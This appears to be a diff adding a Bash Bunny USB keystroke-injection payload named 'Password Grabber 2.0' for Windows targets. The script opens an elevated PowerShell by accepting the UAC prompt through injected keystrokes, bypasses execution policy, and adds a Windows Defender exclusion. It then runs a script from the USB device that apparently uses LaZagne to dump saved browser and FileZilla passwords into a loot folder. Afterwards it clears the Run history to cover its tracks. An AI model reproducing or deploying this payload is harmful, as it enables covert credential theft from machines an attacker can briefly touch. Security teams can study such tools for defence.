@@ -1,0 +1,68 @@
+#!/bin/bash
+#
+#Title: Passowrd Grabber 2.0
+#Description: Grabs password from all sort of things: chrome, internet explorer, firefox, filezilla and more... 
+#             This payload makes use of AleZssandroZ awsome LaZagne password recovery tool.
+#Scripter: Ryan_Van_Mass
+#Target: Windows
+#Credit: jdebetaz, Hak5Darren, AlessandroZ, TeCHemically, dragmus13, RazerBlade
+#
+#Insure you have copied Lazagne.exe to the root payloads directory before running for first time
+
+#Options
+LOOTDIR=/root/udisk/loot/PasswordGrabber
+
+
+############## SETUP ##############
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+
+#Make loot Directory
+mkdir -p $LOOTDIR
+
+############## ATTACK ##############
+LED ATTACK
+#Bypass UAC
+RUN WIN "powershell -Exec Bypass \"Start-Process powershell -Verb runAs\" "
+QUACK DELAY 5000
+QUACK LEFT
+QUACK DELAY 1000
+QUACK ENTER
+sleep 4
+
+#Execution Policy Bypass
+QUACK STRING "Set-ExecutionPolicy Bypass -Scope Process"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "Y"
+QUACK ENTER
+sleep 5
+
+#Windows Defender Bypass
+QUACK STRING "Add-MpPreference -ExclusionExtension .exe"
+QUACK ENTER
+
+QUACK STRING ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\payload.ps1')"
+QUACK ENTER
+sleep 10
+
+############## CLEAN UP ##############
+LED CLEANUP
+
+#Copy LaZagne to payloads Directory
+cp -u /root/udisk/payloads/$SWITCH_POSITION/Backup/lazagne.exe /root/udisk/payloads/
+
+#Removes Run Line Entry
+QUACK STRING "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK ENTER
+QUACK DELAY 500
+
+QUACK STRING "Remove-MpPreference -ExclusionExtension .exe"
+QUACK ENTER
+QUACK DELAY 500
+
+QUACK STRING "exit"
+QUACK ENTER
+############## DONE ##############
+LED FINISH
